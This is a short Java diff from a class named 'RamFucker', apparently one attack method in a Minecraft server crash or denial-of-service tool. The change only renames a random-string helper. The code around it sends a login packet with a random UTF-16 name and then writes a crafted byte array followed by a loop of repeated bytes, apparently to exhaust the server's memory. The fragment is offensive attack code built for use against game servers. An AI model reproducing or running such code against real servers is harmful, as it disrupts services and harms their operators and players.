@@ -32,7 +32,7 @@ public class RamFucker implements IMethod{
         ByteBuf b = Unpooled.buffer();
         ByteBufOutputStream out = new ByteBufOutputStream(b);
             try {
-                channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(RandomUtils.randomUTF16String1(13)+"_XD")).getWrappedPacket()));
+                channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(RandomUtils.randomUTF16String(13)+"_XD")).getWrappedPacket()));
                 out.write(this.xdarr);
                 for(int i = 0; i < 260; i++){
                     out.write(3);
